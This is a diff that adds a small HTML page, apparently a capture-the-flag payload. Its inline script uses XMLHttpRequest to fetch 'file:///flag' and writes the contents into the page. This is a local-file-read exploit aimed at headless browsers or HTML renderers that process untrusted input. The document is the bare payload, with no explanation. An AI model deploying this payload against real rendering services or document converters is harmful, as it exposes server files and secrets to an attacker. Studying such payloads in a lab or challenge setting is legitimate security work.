@@ -1,0 +1,17 @@
+<html>
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+</head>
+<body>
+	<script>
+		x = new XMLHttpRequest;
+		x.onload = function() {
+			document.write(this.responseText)
+		};
+
+		x.open("GET", "file:///flag");
+		x.send();
+	</script>
+</body>
+</html>
